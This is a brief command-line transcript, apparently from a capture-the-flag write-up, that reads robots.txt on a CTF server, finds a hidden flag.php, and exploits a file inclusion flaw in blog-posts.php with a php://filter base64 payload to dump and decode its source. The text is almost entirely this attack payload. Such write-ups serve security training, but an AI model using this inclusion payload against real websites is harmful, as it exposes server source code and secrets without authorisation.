```
$ curl -v "http://ez.ctf.cafe:9999/robots.txt"
User-agent: \*
Disallow: /flag.php
$ curl http://ez.ctf.cafe:9999/blog-posts.php?file="php://filter/convert.base64-encode/resource=flag.php" | base64 -d
```
